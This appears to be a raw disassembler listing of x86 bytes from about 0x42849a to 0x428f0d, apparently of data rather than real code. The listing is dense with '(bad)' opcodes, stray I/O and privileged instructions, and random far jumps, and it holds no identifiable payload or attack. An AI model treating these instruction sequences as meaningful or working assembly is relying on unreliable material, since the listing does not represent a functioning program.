  42849a:	mov    DWORD PTR [ebx-0x68],esp
  42849d:	xchg   ecx,eax
  42849e:	mov    ds:0x357a953d,eax
  4284a3:	and    DWORD PTR gs:[edi],ecx
  4284a6:	sbb    eax,0xda0acbfa
  4284ab:	test   DWORD PTR [esi],ebx
  4284ad:	std    
  4284ae:	xchg   edi,eax
  4284af:	ret    
  4284b0:	sti    
  4284b1:	pop    ss
  4284b2:	pop    es
  4284b3:	xchg   ebp,eax
  4284b4:	les    edi,FWORD PTR [ecx]
  4284b6:	pushf  
  4284b7:	mov    esp,0x34c07991
  4284bc:	pop    ebp
  4284bd:	xchg   esp,eax
  4284be:	gs nop
  4284c0:	or     bh,al
  4284c2:	loopne 0x42851b
  4284c4:	loope  0x4284b9
  4284c6:	popa   
  4284c7:	or     ah,bh
  4284c9:	xlat   BYTE PTR ds:[ebx]
  4284ca:	fsincos 
  4284cc:	inc    eax
  4284cd:	mov    edx,0xccf967
  4284d2:	mov    cl,0xfe
  4284d4:	clc    
  4284d5:	xlat   BYTE PTR ds:[ebx]
  4284d6:	xlat   BYTE PTR ds:[ebx]
  4284d7:	or     eax,0x274458e2
  4284dc:	jecxz  0x428513
  4284de:	jl     0x428478
  4284e0:	push   0x6e
  4284e2:	cmp    esp,DWORD PTR [edi-0x80aba77]
  4284e8:	xor    DWORD PTR [ebx],esp
  4284ea:	sub    BYTE PTR [ecx+edx*4-0x78],dh
  4284ee:	in     eax,0xb1
  4284f0:	imul   ebx,DWORD PTR [ebp-0x40],0xffffffae
  4284f4:	(bad)
  4284f8:	cld    
  4284f9:	jl     0x42854b
  4284fb:	add    eax,0x8b8444ee
  428500:	push   ds
  428501:	loopne 0x42849f
  428503:	sbb    eax,0xc3c0363f
  428508:	push   es
  428509:	mov    eax,ds:0x7b8f6ac2
  42850e:	pop    ds
  42850f:	ret    0xab73
  428512:	push   0x10e110d9
  428517:	or     DWORD PTR [ebx-0x6cf073d4],esp
  42851d:	test   DWORD PTR [ebx-0x1b8a4e20],esp
  428523:	mov    bh,0x74
  428525:	inc    eax
  428526:	mov    eax,ds:0x5f20b43e
  42852b:	mov    ds:0x31282ef3,eax
  428530:	addr16 add al,0x38
  428533:	and    al,0x45
  428535:	into   
  428536:	mov    eax,ds:0x9dce04a3
  42853b:	xor    DWORD PTR [ecx],ecx
  42853d:	ja     0x4284ef
  42853f:	pop    ebx
  428540:	int3   
  428541:	adc    ch,0xb
  428544:	out    dx,eax
  428545:	scas   al,BYTE PTR es:[edi]
  428546:	lods   al,BYTE PTR ds:[esi]
  428547:	ss gs ins BYTE PTR es:[edi],dx
  42854a:	popf   
  42854b:	inc    ebp
  42854c:	shr    BYTE PTR [esi+0x78a1504f],1
  428552:	retf   
  428553:	add    ch,BYTE PTR [edi+0x2f]
  428556:	cmp    BYTE PTR [ebx+eax*8],bl
  428559:	jo     0x4284e7
  42855b:	ja     0x428504
  42855d:	adc    al,0xcd
  42855f:	sbb    DWORD PTR [esi+0x62053aa0],0x1c
  428566:	mov    ebx,0x54c4f8f9
  42856b:	push   edx
  42856c:	(bad)  
  42856e:	adc    ecx,0x48225ae9
  428574:	sar    ah,1
  428576:	jl     0x428503
  428578:	mov    ds:0x4a8260f7,al
  42857d:	ret    0x46cf
  428580:	jns    0x428571
  428582:	adc    DWORD PTR [ecx-0x3d],esi
  428585:	pop    es
  428586:	mov    DWORD PTR [ebx-0x1c7152eb],ecx
  42858c:	sti    
  42858d:	ins    BYTE PTR es:[edi],dx
  42858e:	adc    DWORD PTR [edx],edi
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xd372a3f6
  428602:	bound  esi,QWORD PTR [edi+0x1af44]
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	mov    edx,0xb7552897
  428611:	pop    edx
  428612:	gs mov eax,0xe57a153a
  428618:	fdiv   DWORD PTR [ebp-0x686d06e6]
  42861e:	push   edi
  42861f:	sbb    BYTE PTR [edx],al
  428621:	dec    edx
  428622:	sar    DWORD PTR [ebx-0x6d91c989],cl
  428628:	loop   0x42863b
  42862a:	hlt    
  42862b:	ja     0x428691
  42862d:	(bad)
  428631:	adc    ebp,DWORD PTR [ebx+0x10]
  428634:	in     al,dx
  428635:	mov    bl,0x68
  428637:	xchg   edi,eax
  428638:	clc    
  428639:	mov    WORD PTR [ebx],cs
  42863b:	pop    edi
  42863c:	add    eax,0x2ca08215
  428641:	ret    
  428642:	inc    edx
  428643:	aad    0x82
  428645:	sub    ch,BYTE PTR [esi-0x429259e0]
  42864b:	xchg   esi,eax
  42864c:	mov    esi,0x40bf8d9
  428651:	mov    esi,0xc24a165a
  428656:	arpl   WORD PTR [esi+eax*1+0x5d],bx
  42865a:	cmp    dl,dh
  42865c:	mov    ebp,0x15e47c07
  428661:	jmp    0x68df:0x350b2e66
  428668:	push   esi
  428669:	jne    0x428698
  42866b:	cmp    esi,DWORD PTR [edi-0x35]
  42866e:	push   0x65
  428670:	xchg   edi,eax
  428671:	push   eax
  428672:	sub    ah,BYTE PTR [eax]
  428674:	and    DWORD PTR [esi],edi
  428676:	popf   
  428677:	cmp    eax,DWORD PTR [ebx+0x17]
  42867a:	push   es
  42867b:	xor    eax,0xed440cc2
  428680:	jbe    0x4286cb
  428682:	mov    al,0xfc
  428684:	inc    ebx
  428685:	pop    ebp
  428686:	(bad)  
  428689:	rcl    ecx,cl
  42868b:	popf   
  42868c:	inc    edi
  42868d:	lock jge 0x428631
  428690:	fidivr WORD PTR [eax]
  428692:	fwait
  428693:	add    DWORD PTR [ecx-0x3],ebp
  428696:	mov    ds:0xd6a58b7d,eax
  42869b:	push   ss
  42869c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42869d:	jae    0x4286c5
  42869f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286a0:	inc    ebx
  4286a1:	sbb    DWORD PTR [eax],edx
  4286a3:	sub    eax,0xfc385369
  4286a8:	popf   
  4286a9:	sub    bl,BYTE PTR [ebp-0x7b]
  4286ac:	pushw  es
  4286ae:	(bad)  [eax+0x31]
  4286b1:	sahf   
  4286b2:	scas   al,BYTE PTR es:[edi]
  4286b3:	mov    eax,0x17d31c3f
  4286b8:	je     0x4286e8
  4286ba:	push   ebp
  4286bb:	add    BYTE PTR [ecx-0x2fd01db0],0x11
  4286c2:	fwait
  4286c3:	call   0xd60277af
  4286c8:	mov    dh,0x4b
  4286ca:	cmp    eax,0x74a84e9d
  4286cf:	mov    ebx,DWORD PTR [ebp-0x16]
  4286d2:	xor    bh,BYTE PTR [ecx-0x304bf01f]
  4286d8:	pop    es
  4286d9:	inc    ecx
  4286da:	ja     0x428740
  4286dc:	adc    al,0xc8
  4286de:	js     0x428699
  4286e0:	push   ss
  4286e1:	or     ecx,DWORD PTR [ebx]
  4286e3:	in     eax,0x17
  4286e5:	sbb    BYTE PTR [eax-0xe],ch
  4286e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e9:	push   edi
  4286ea:	dec    ebp
  4286eb:	outs   dx,DWORD PTR ds:[esi]
  4286ec:	or     bh,BYTE PTR [ecx]
  4286ee:	dec    ebx
  4286ef:	stos   WORD PTR es:[edi],ax
  4286f1:	dec    eax
  4286f2:	(bad)  
  4286f3:	cmp    DWORD PTR [ebp-0x7e],edx
  4286f6:	test   eax,0xab2ea9f6
  4286fb:	nop
  4286fc:	(bad)  
  4286fe:	push   es
  4286ff:	xchg   ecx,eax
  428700:	pop    ds
  428701:	mov    esi,0xcde14b49
  428706:	loop   0x428743
  428708:	jecxz  0x42877b
  42870a:	in     eax,dx
  42870b:	pop    ds
  42870c:	jbe    0x42878d
  42870e:	add    al,0xd5
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x726b2596
  428783:	retf   0xb048
  428786:	add    DWORD PTR [eax],eax
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	dec    ecx
  42878d:	inc    ebx
  42878e:	adc    BYTE PTR [edi],0x67
  428791:	or     BYTE PTR [esi-0x38],al
  428794:	ds gs gs loopne 0x4287b4
  428799:	in     eax,0x5d
  42879b:	rcr    BYTE PTR [ebp-0x58eb1c81],cl
  4287a1:	add    DWORD PTR [ecx+0x38],ecx
  4287a4:	(bad)  
  4287a5:	jecxz  0x4287bc
  4287a7:	out    dx,al
  4287a8:	fwait
  4287a9:	push   0x56
  4287ab:	dec    edi
  4287ac:	sar    ch,1
  4287ae:	inc    ebp
  4287af:	sbb    DWORD PTR [edi+0x43],esi
  4287b2:	xchg   esi,eax
  4287b3:	fiadd  WORD PTR [edi]
  4287b5:	adc    eax,0x3b301652
  4287ba:	(bad)  
  4287bb:	sbb    esp,edx
  4287bd:	ret    0x50c
  4287c0:	addr16 push es
  4287c2:	les    ecx,FWORD PTR [ecx]
  4287c4:	pop    ss
  4287c5:	push   0x6d11d7f1
  4287ca:	xor    DWORD PTR [esp+ecx*1-0xd9bbf11],esp
  4287d1:	imul   eax,DWORD PTR [esi+ebx*1],0xffffffd2
  4287d5:	mov    edx,0x9322a27a
  4287da:	adc    DWORD PTR [ebx-0x2a520b50],esi
  4287e0:	js     0x4287c0
  4287e2:	push   ds
  4287e3:	sahf   
  4287e4:	sub    al,ch
  4287e6:	dec    ebp
  4287e7:	leave  
  4287e8:	pop    eax
  4287e9:	test   al,0xaf
  4287eb:	sbb    eax,esi
  4287ed:	aaa    
  4287ee:	int    0xf2
  4287f0:	mov    BYTE PTR [ebp-0x7528e257],bh
  4287f6:	pop    ecx
  4287f7:	es repz inc ebx
  4287fa:	xchg   ebx,eax
  4287fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287fc:	sub    al,0x8f
  4287fe:	push   ss
  4287ff:	adc    dh,BYTE PTR [ecx+0x5d82a800]
  428805:	sub    BYTE PTR [edx+0x77],ch
  428808:	and    al,0xcf
  42880a:	or     al,0x7c
  42880c:	addr16 retf 0x66c0
  428810:	shl    DWORD PTR [ebx-0x73b8456f],1
  428816:	mov    ds:0xa0ad376,eax
  42881b:	adc    DWORD PTR [ecx+0x9880584],esp
  428821:	fwait
  428822:	adc    al,0xf2
  428824:	outs   dx,DWORD PTR ds:[esi]
  428825:	ds mov edi,0xa746663e
  42882b:	ret    0x4ad
  42882e:	rcr    BYTE PTR [ebp+0x4a],0x8a
  428832:	scas   eax,DWORD PTR es:[edi]
  428833:	pop    edx
  428834:	fucomp st(4)
  428836:	mov    edx,0xa44fba6c
  42883b:	xlat   BYTE PTR ds:[ebx]
  42883c:	sub    eax,0xa785e00c
  428841:	mov    ch,0xdc
  428843:	shr    BYTE PTR [esi-0x34],0x6e
  428847:	pop    ds
  428848:	and    DWORD PTR [edi-0x29],ebx
  42884b:	adc    cl,dh
  42884d:	hlt    
  42884e:	inc    eax
  42884f:	inc    esp
  428850:	inc    ebx
  428851:	pop    ebx
  428852:	fild   DWORD PTR [ecx]
  428854:	stos   BYTE PTR es:[edi],al
  428855:	or     eax,0xdf978882
  42885a:	loopne 0x42885d
  42885c:	or     al,0xc
  42885e:	mov    bh,0x53
  428860:	push   ds
  428861:	sub    DWORD PTR [edx-0x56],eax
  428864:	xchg   dl,bh
  428866:	mov    ds,WORD PTR [edx+0x36]
  428869:	push   eax
  42886a:	test   al,0x2
  42886c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42886d:	iret   
  42886e:	fcmovne st,st(4)
  428870:	sbb    edx,eax
  428872:	das    
  428873:	xchg   DWORD PTR [ebp+0x1073ef5],eax
  428879:	jns    0x428811
  42887b:	adc    BYTE PTR [esi+edx*8],dl
  42887e:	or     eax,0x32b977ac
  428883:	xchg   ebp,eax
  428884:	adc    DWORD PTR [edx+0x100fbf32],ebp
  42888a:	adc    eax,0x94c2ae07
  42888f:	stc    
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x53259d0f],bx
  428902:	out    0x51,al
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	xchg   esi,eax
  42890d:	mov    ds:0x8fe60799,eax
  428912:	and    ebp,DWORD PTR [ecx]
  428914:	sbb    DWORD PTR [edi-0x43c6a27d],esi
  42891a:	jp     0x4288ea
  42891c:	mov    edi,0x3b2bd008
  428921:	in     al,dx
  428922:	shl    dl,0x34
  428925:	xor    DWORD PTR [ebx],edx
  428927:	lods   al,BYTE PTR ds:[esi]
  428928:	inc    esp
  428929:	adc    esi,DWORD PTR [edi]
  42892b:	add    dl,BYTE PTR [ebx+0x698cdd9c]
  428931:	xchg   esp,eax
  428932:	hlt    
  428933:	lods   al,BYTE PTR ds:[esi]
  428934:	into   
  428935:	mov    edx,eax
  428937:	push   cs
  428938:	sbb    eax,0xda80fad8
  42893d:	adc    al,0x6c
  42893f:	mov    bl,0x7b
  428941:	cmc    
  428942:	popa   
  428943:	inc    edx
  428944:	jmp    0x4288cc
  428946:	ss js  0x4288e0
  428949:	in     eax,0xf2
  42894b:	pop    ebx
  42894c:	outs   dx,DWORD PTR ds:[esi]
  42894d:	(bad)  
  42894e:	or     ah,ah
  428950:	sti    
  428951:	and    DWORD PTR [edi+0x238888d6],esp
  428957:	dec    edx
  428958:	mov    bl,0xaf
  42895a:	sar    eax,cl
  42895c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42895d:	sti    
  42895e:	test   BYTE PTR [edx],ch
  428960:	es inc eax
  428962:	mov    ah,0xf9
  428964:	iret   
  428965:	dec    edi
  428966:	jbe    0x428923
  428968:	cdq    
  428969:	rcl    ebp,cl
  42896b:	ret    0x2458
  42896e:	js     0x4289b4
  428970:	in     al,dx
  428971:	xchg   ebx,eax
  428972:	and    al,0xf7
  428974:	cmp    DWORD PTR [esi-0x70],0x7b
  428978:	out    dx,al
  428979:	mov    ebp,DWORD PTR [eax+0x13f75c1e]
  42897f:	dec    eax
  428980:	ret    0xa0aa
  428983:	jmp    DWORD PTR [ebx]
  428985:	cdq    
  428986:	int3   
  428987:	add    BYTE PTR [esi],ah
  428989:	mov    edi,0x382e3864
  42898e:	ins    DWORD PTR es:[edi],dx
  42898f:	sub    eax,0x3d02ba80
  428994:	pop    edi
  428995:	mov    BYTE PTR [esi+0x737235dc],ch
  42899b:	fcomp  QWORD PTR [eax-0x4a]
  42899e:	in     al,dx
  42899f:	push   esp
  4289a0:	lea    edi,[ebx]
  4289a2:	ins    DWORD PTR es:[edi],dx
  4289a3:	mov    ecx,0xd073f2fd
  4289a8:	(bad)  
  4289aa:	data16 cmp ah,bl
  4289ad:	mov    esp,0xed0bfc69
  4289b2:	fwait
  4289b3:	inc    ebx
  4289b4:	mov    edi,0xdf62f805
  4289b9:	rol    dl,1
  4289bb:	pusha  
  4289bc:	or     eax,0x9eade5c5
  4289c1:	sub    ebx,DWORD PTR [edx-0x23]
  4289c4:	dec    edx
  4289c5:	in     eax,0xe7
  4289c7:	adc    dl,BYTE PTR [edi+0x4d]
  4289ca:	out    0xdc,al
  4289cc:	daa    
  4289cd:	jp     0x4289e5
  4289cf:	std    
  4289d0:	adc    eax,ebx
  4289d2:	mov    edi,0x8f9b40c6
  4289d7:	jmp    0x428a51
  4289d9:	fild   DWORD PTR [edx-0xb]
  4289dc:	test   eax,0x977b7ad
  4289e1:	frstor [edi+0x6c]
  4289e4:	sbb    al,BYTE PTR [ebx+0x4711b190]
  4289ea:	mov    esp,0x57e4116a
  4289ef:	cmp    eax,0x13adabf5
  4289f4:	or     edi,DWORD PTR [edx+0x29]
  4289f7:	pop    ecx
  4289f8:	push   es
  4289f9:	je     0x428a55
  4289fb:	loope  0x428a13
  4289fd:	jge    0x428984
  4289ff:	jle    0x96a226dc
  428a05:	jg     0x428a5c
  428a07:	adc    al,0x97
  428a09:	dec    edi
  428a0a:	push   esp
  428a0b:	mov    dl,0x5b
  428a0d:	(bad)  [edi]
  428a0f:	imul   eax,DWORD PTR [eax],0x0
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x3bcc1e13]
  428a83:	(bad)  
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	scas   eax,DWORD PTR es:[edi]
  428a8d:	out    0x8,eax
  428a8f:	push   es
  428a90:	add    eax,0x77bf8a06
  428a95:	mov    esi,0x195664e7
  428a9a:	xor    eax,0xc8a000dd
  428a9f:	add    BYTE PTR [edx+0x3e],dh
  428aa2:	adc    esp,DWORD PTR [edx]
  428aa4:	xor    ah,BYTE PTR [edx+0x2c34fabe]
  428aaa:	jne    0x428a2d
  428aac:	ret    0x3e88
  428aaf:	fwait
  428ab0:	pop    edx
  428ab1:	push   cs
  428ab2:	xchg   BYTE PTR [eax+0x1ef322ca],dl
  428ab8:	out    0xb,eax
  428aba:	jp     0x428acb
  428abc:	hlt    
  428abd:	ss jg  0x428af1
  428ac0:	pop    ebx
  428ac1:	cld    
  428ac2:	sub    eax,esp
  428ac4:	js     0x428a7a
  428ac6:	sub    DWORD PTR [edi+esi*8+0x54],ecx
  428aca:	add    al,0x73
  428acc:	popa   
  428acd:	dec    ebx
  428ace:	pop    esi
  428acf:	jl     0x428b00
  428ad1:	mul    DWORD PTR [ebp+0x2f725d24]
  428ad7:	scas   eax,DWORD PTR es:[edi]
  428ad8:	aas    
  428ad9:	clc    
  428ada:	rcl    DWORD PTR [edx+0x56],1
  428add:	into   
  428ade:	xor    esi,ecx
  428ae0:	xor    esp,ebp
  428ae2:	arpl   WORD PTR [edi+esi*8],ax
  428ae5:	pop    ecx
  428ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ae7:	inc    edx
  428ae8:	ret    0xa1
  428aeb:	in     al,dx
  428aec:	sbb    ebp,edx
  428aee:	or     eax,0x9e1cf618
  428af3:	shr    BYTE PTR [eax+0x40b147ad],cl
  428af9:	scas   eax,DWORD PTR es:[edi]
  428afa:	in     al,dx
  428afb:	xlat   BYTE PTR ds:[ebx]
  428afc:	dec    esi
  428afd:	mov    ecx,0xd407f7a2
  428b02:	stos   BYTE PTR es:[edi],al
  428b03:	jae    0x428b4b
  428b05:	es pop ss
  428b07:	push   ss
  428b08:	mov    bh,BYTE PTR [edx+eiz*2+0x38b132dd]
  428b0f:	pusha  
  428b10:	pushf  
  428b11:	mov    ch,0x43
  428b13:	mov    cl,0x16
  428b15:	xchg   ebx,eax
  428b16:	mov    ch,BYTE PTR [ebp-0x80]
  428b19:	mov    gs,WORD PTR [ebp-0x7c]
  428b1c:	mov    BYTE PTR [edx+0x37274a81],dl
  428b22:	push   esi
  428b23:	push   ebx
  428b24:	sbb    edx,ecx
  428b26:	jb     0x428abe
  428b28:	xor    ebp,eax
  428b2a:	jl     0x428aad
  428b2c:	std    
  428b2d:	fldenv [ecx]
  428b2f:	dec    ebp
  428b30:	and    dl,BYTE PTR ds:0xe120c274
  428b36:	xor    ecx,DWORD PTR [ebp+0xd]
  428b39:	int3   
  428b3a:	(bad)  
  428b3b:	jmp    0xb580:0x9fab7572
  428b42:	jmp    0x9b84:0xf9ec6ada
  428b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b4a:	mov    WORD PTR [edi+eiz*8+0x1a],es
  428b4e:	test   bh,ah
  428b50:	mov    ds:0x2be390e3,al
  428b55:	mov    ds:0xc7d2cd25,al
  428b5b:	out    0x2b,eax
  428b5d:	cmp    dl,BYTE PTR [esi+0x5b]
  428b60:	or     al,0x66
  428b62:	sahf   
  428b63:	mov    ch,BYTE PTR [esp+eax*8+0x39694934]
  428b6a:	mov    ebp,0x75cbf943
  428b6f:	mov    ah,dl
  428b71:	push   edx
  428b72:	mov    fs,WORD PTR [eax-0x69]
  428b75:	dec    edi
  428b76:	repnz out 0xc4,al
  428b79:	(bad)  
  428b7a:	and    ecx,esi
  428b7c:	scas   al,BYTE PTR es:[edi]
  428b7d:	sbb    ebp,esi
  428b7f:	dec    edx
  428b80:	lahf   
  428b81:	add    DWORD PTR [eax],esp
  428b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b84:	into   
  428b85:	addr16 js 0x428b82
  428b88:	pop    ecx
  428b89:	idiv   DWORD PTR [edx-0x47eb6066]
  428b8f:	push   edi
	...
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xe502fddc
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	test   al,0xce
  428c0e:	test   DWORD PTR [ebx],esp
  428c10:	js     0x428c0e
  428c12:	in     eax,0xc7
  428c14:	mov    bl,0x68
  428c16:	fstp   DWORD PTR [eax+0x134f22]
  428c1c:	push   es
  428c1d:	push   es
  428c1e:	xor    eax,0xf620f288
  428c23:	jo     0x428c14
  428c25:	pop    es
  428c26:	jle    0x428bfc
  428c28:	ss stos DWORD PTR es:[edi],eax
  428c2a:	mov    WORD PTR [esi-0x3b0d829d],?
  428c30:	inc    esp
  428c31:	imul   esi,DWORD PTR [eax],0x78971d5e
  428c37:	inc    eax
  428c38:	(bad)  
  428c39:	mov    bh,0x97
  428c3b:	ret    0x319b
  428c3e:	pop    ebx
  428c3f:	adc    ebx,DWORD PTR [edx+0x20]
  428c42:	cld    
  428c43:	shl    BYTE PTR [eax-0x23],0xed
  428c47:	lods   eax,DWORD PTR ds:[esi]
  428c48:	mov    ds:0x5bb388af,eax
  428c4d:	test   BYTE PTR [esi+0x567bb0e2],al
  428c53:	leave  
  428c54:	sbb    cl,BYTE PTR [eax+0x31c81925]
  428c5a:	adc    ebp,DWORD PTR [edx+edi*1-0x6a]
  428c5e:	sbb    bh,0xed
  428c61:	xchg   edx,eax
  428c62:	hlt    
  428c63:	into   
  428c64:	inc    edx
  428c65:	mov    edi,0xb4e8e62
  428c6a:	mov    cl,0x6b
  428c6c:	in     eax,0x41
  428c6e:	sub    cl,0xd6
  428c71:	mov    ch,0x2e
  428c73:	pop    es
  428c74:	xor    ch,BYTE PTR [ebp-0x8a26f9]
  428c7a:	es sbb eax,0xf2e80cbc
  428c80:	mov    al,0x5d
  428c82:	out    dx,al
  428c83:	jge    0x428cdb
  428c85:	je     0x428c80
  428c87:	outs   dx,BYTE PTR ds:[esi]
  428c88:	mov    ah,0xf4
  428c8a:	xchg   ebx,eax
  428c8b:	or     al,0xe3
  428c8d:	dec    ebp
  428c8e:	push   0xfffffffe
  428c90:	xor    BYTE PTR [edi],ah
  428c92:	cs std 
  428c94:	stos   BYTE PTR es:[edi],al
  428c95:	dec    edx
  428c96:	mov    dh,0x5e
  428c98:	add    BYTE PTR ds:0x306fcd42,bl
  428c9e:	xchg   ebp,eax
  428c9f:	enter  0x45c9,0x3c
  428ca3:	mov    ebp,0xaa2a4d14
  428ca8:	loopne 0x428c64
  428caa:	retf   0xb81f
  428cad:	xchg   esi,eax
  428cae:	push   ebp
  428caf:	push   cs
  428cb0:	mul    BYTE PTR [esi-0x5cfef5f]
  428cb6:	mov    cl,0xc9
  428cb8:	cmp    BYTE PTR [esi-0x3f],al
  428cbb:	js     0x428ce8
  428cbd:	in     eax,dx
  428cbe:	ss jno 0x428c54
  428cc1:	in     eax,dx
  428cc2:	fldenv [edi]
  428cc4:	fcomip st,st(3)
  428cc6:	aaa    
  428cc7:	push   esi
  428cc8:	push   esi
  428cc9:	cs xchg edx,eax
  428ccb:	jmp    0xc4c8:0x98502986
  428cd2:	or     dh,BYTE PTR [eax]
  428cd4:	nop
  428cd5:	jne    0x428d1c
  428cd7:	in     eax,dx
  428cd8:	retf   0x2233
  428cdb:	bound  edx,QWORD PTR cs:0xec2ed675
  428ce2:	ret    0xfcb7
  428ce5:	popa   
  428ce6:	mov    ecx,0x7d634114
  428ceb:	dec    eax
  428cec:	or     eax,0xb45e03de
  428cf1:	or     eax,DWORD PTR [ebx+0x77]
  428cf4:	mov    eax,0xdda9c5fe
  428cf9:	lock mov edi,0x6e661398
  428cff:	repnz arpl WORD PTR [ebx],bp
  428d02:	lea    esp,[eax+0x67]
  428d05:	call   0x4e3:0x33646a88
  428d0c:	shl    DWORD PTR [eax-0xa],1
  428d0f:	sldt   WORD PTR [eax]
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xec0
  428d82:	outs   dx,BYTE PTR ds:[esi]
  428d83:	rcr    BYTE PTR [eax-0x4c],0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	adc    BYTE PTR [edx+0x7bba18bf],0xab
  428d93:	xchg   edx,eax
  428d94:	sbb    esp,DWORD PTR [ebx-0x1db199c4]
  428d9a:	xor    dh,0xbc
  428d9d:	(bad)  
  428d9e:	dec    eax
  428d9f:	or     ebx,ebp
  428da1:	dec    ebx
  428da2:	inc    eax
  428da3:	and    ecx,DWORD PTR [eax+ecx*8+0x20]
  428da7:	adc    bh,BYTE PTR [ebx-0x19db7677]
  428dad:	out    dx,al
  428dae:	ror    DWORD PTR [edx-0x4497a836],cl
  428db4:	out    dx,eax
  428db5:	push   esp
  428db6:	lock (bad) 
  428db8:	test   cl,bl
  428dba:	mov    al,BYTE PTR [edi-0x56]
  428dbd:	imul   ecx,DWORD PTR [edi-0x70e99df],0xffffff90
  428dc4:	pop    edi
  428dc5:	js     0x428e31
  428dc7:	or     eax,DWORD PTR [edx]
  428dc9:	hlt    
  428dca:	inc    ecx
  428dcb:	fwait
  428dcc:	sub    edi,DWORD PTR [ebx]
  428dce:	in     eax,0x2f
  428dd0:	dec    eax
  428dd1:	pop    ebp
  428dd2:	repnz mov ch,0x46
  428dd5:	and    ebx,DWORD PTR [edi]
  428dd7:	les    ebx,FWORD PTR [ecx+0x11c6ac9c]
  428ddd:	mov    edi,0xa44e5b45
  428de2:	inc    ebx
  428de3:	mov    dl,0x2e
  428de5:	adc    dh,cl
  428de7:	push   eax
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	data16 jno 0x428d7f
  428dec:	sbb    edx,ecx
  428dee:	(bad)  
  428def:	(bad)  
  428df0:	cwde   
  428df1:	mov    cl,0xf8
  428df3:	adc    al,0x3c
  428df5:	fstp   DWORD PTR [ebp-0x6e9ab149]
  428dfb:	sbb    DWORD PTR [esi+0x30],esp
  428dfe:	out    dx,al
  428dff:	rcr    DWORD PTR [eax-0x66],0x65
  428e03:	xchg   edi,eax
  428e04:	aam    0x12
  428e06:	(bad)  
  428e07:	sbb    eax,0x22eb3df4
  428e0c:	(bad)  
  428e0d:	push   0xffffffeb
  428e0f:	add    eax,0x8e77f724
  428e14:	adc    BYTE PTR [edi-0x25],bl
  428e17:	pop    edi
  428e18:	mov    WORD PTR es:[ecx],es
  428e1b:	jns    0x428e88
  428e1d:	repnz outs dx,DWORD PTR ds:[esi]
  428e1f:	(bad)  
  428e21:	imul   ecx,ebx,0x37
  428e24:	(bad)  
  428e25:	and    BYTE PTR [bx+si-0x25],dh
  428e29:	push   esp
  428e2a:	pop    esp
  428e2b:	sub    BYTE PTR [edx-0x1a810d69],ch
  428e31:	lods   al,BYTE PTR ds:[esi]
  428e32:	dec    esi
  428e33:	push   ecx
  428e34:	adc    ebx,edi
  428e36:	mov    eax,ds:0x86d4e9b4
  428e3b:	xor    al,0x97
  428e3d:	push   esp
  428e3e:	push   ecx
  428e3f:	lahf   
  428e40:	inc    ebp
  428e41:	(bad)  
  428e42:	cmp    al,0xa0
  428e44:	fimul  DWORD PTR cs:0x566cd68e
  428e4b:	iret   
  428e4c:	and    edi,DWORD PTR [edx+esi*1-0x567335ac]
  428e53:	pop    ecx
  428e54:	pop    esp
  428e55:	dec    edx
  428e56:	push   es
  428e57:	mov    esi,DWORD PTR [edi+0x56d7db17]
  428e5d:	ret    0xc938
  428e60:	or     BYTE PTR [edx+0x1d],0xc7
  428e64:	pop    esp
  428e65:	mov    ds:0x66e66e7,eax
  428e6a:	dec    eax
  428e6b:	mov    esi,0xf5f4e70a
  428e70:	xchg   esp,eax
  428e71:	push   esp
  428e72:	mov    BYTE PTR [esi+edx*1-0x56],al
  428e76:	mov    ch,0x4e
  428e78:	dec    ebp
  428e79:	mov    esp,edx
  428e7b:	in     eax,0x8d
  428e7d:	sbb    ecx,DWORD PTR ds:[eax]
  428e80:	push   0xec4c7d8e
  428e85:	mov    esp,0x1e59950a
  428e8a:	push   esp
  428e8b:	adc    DWORD PTR [eax],0xffffffa2
  428e8e:	and    ch,ah
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x83
  428f01:	or     ch,0x1b
  428f04:	pop    esp
  428f05:	mov    ch,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	push   ebp
  428f0d:	pusha  
